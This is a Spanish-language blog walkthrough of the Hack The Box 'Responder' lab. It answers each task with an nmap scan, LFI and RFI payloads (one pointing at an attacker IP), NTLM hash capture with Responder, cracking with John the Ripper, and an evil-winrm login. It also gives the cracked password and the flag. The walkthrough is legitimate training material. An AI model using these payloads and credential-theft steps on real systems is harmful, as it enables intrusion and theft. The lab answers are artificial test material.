---
title: Máquina Responder
published: true
---

Jorge Marco Arráez

He estado unos dias intentando la máquina Timelapse, pero he llegado a un punto en el que me he estancado. Tengo que aprender como usar las debilidades de winrm para poder continuar. Mientras tanto, continuo con el starting point que ya estoy empezando la fase 2.

## [](#header-3) 1)   How many TCP ports are open on the machine? 

Con el parámero -sS le digo que haga un escaneo TCP/SYN porque al ser una máquina windows agiliza el proceso, con -n le indico que no quiero que haga resolución por dns para que vaya más rápido, con min-rate especifico la minima cantidad de paquetes que quiero que emita por segundo. -p- es para que escanee todos los puertos y -Pn para que detecte la máquina si o sí.
```
nmap -sS -n --min-rate 5000 -p- -Pn $IP
```

3

## [](#header-3) 2)    When visiting the web service using the IP address, what is the domain that we are being redirected to? 

He tenido que editar el archivo /etc/hosts porque se estaba aplicando virtual hosting, con añadir "$IP  unika.htb" ya he podido acceder a la página

unika.htb


## [](#header-3) 3)   Which scripting language is being used on the server to generate webpages? 

php

## [](#header-3) 4)   What is the name of the URL parameter which is used to load different language versions of the webpage? 

page

## [](#header-3) 5)   Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 

```
../../../../../../../../windows/system32/drivers/etc/hosts
```

## [](#header-3) 6)   Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 

//10.10.14.6/somefile

## [](#header-3) 7)    What does NTLM stand for? 

new technology lan manager

## [](#header-3) 8)   Which flag do we use in the Responder utility to specify the network interface? 

Para que el programa pudiese funcionar, he tenido que matar algunos procesos que estaban ocurriendo en el puerto 445 y 139. Con:

```
sudo kill -9 `sudo lsof -t -i:139`
sudo kill -9 `sudo lsof -t -i:445`
responder -I tun0 -w -d 
```

-I

## [](#header-3) 9)  There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 

john the ripper

## [](#header-3) 10)  What is the password for the administrator user? 
```
john -w=/opt/wordlist/rockyout.txt hash.txt
```
badminton

## [](#header-3) 11)  We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 

5985

## [](#header-3) 12)  Submit root flag 

```
evil-winrm -i 10.129.93.222 -u administrator -p badminton
ls
cd C:\Users
ls
cd mike
ls
cd Desktop
ls
text flag.txt
```

```
ea81b7afddd03efaa0945333ed147fac
```